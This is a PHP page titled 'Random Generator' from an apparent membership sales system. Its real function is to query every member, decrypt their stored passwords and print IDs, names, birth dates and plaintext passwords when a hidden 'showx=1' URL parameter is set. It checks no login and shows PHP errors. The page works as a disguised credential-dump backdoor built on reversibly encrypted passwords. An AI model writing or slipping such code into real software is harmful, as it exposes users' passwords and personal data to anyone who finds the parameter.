<?php
session_start();
ini_set('display_errors', true);
error_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);
include_once("../server/config.php");


   include_once("../classes/memberclass.php");
   include_once(CLASS_DIR."dateclass.php");
   include_once("../classes/networkclass.php");
   include_once(CLASS_DIR."ifaceclass.php");
   include_once(CLASS_DIR."ruleconfigclass.php");
   include_once(CLASS_DIR."komisiclass.php");
   include_once(CLASS_DIR."jualclass.php");
   include_once(CLASS_DIR."systemclass.php");
   include_once(CLASS_DIR."productclass.php");
   include_once(CLASS_DIR."texttoimageclass.php");
    error_reporting (E_ALL ^ E_NOTICE);

function generateRandomString($length = 6) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
<title>Random Generator</title>
</head>

<body>
<?
   $vSQL="select * from m_anggota order by fidsys ";
   $db->query($vSQL);
   
   while ($db->next_record()) {
      $vID=$db->f('fidmember');
      $vNama=$db->f('fnama');
      $vTglLahir=$oPhpdate->YMD2DMY($db->f('ftgllahir'));
      $vPasswd=$db->f('fpassword');
      $vTTL=$db->f('ftempatlahir');
      $vPwdDec=$oSystem->doED('decrypt',$vPasswd);
      if ($_GET['showx']=='1')
      echo "$vID :: $vNama :: $vTglLahir :: $vPwdDec <br>";
   }


?>
    
</body>

</html>
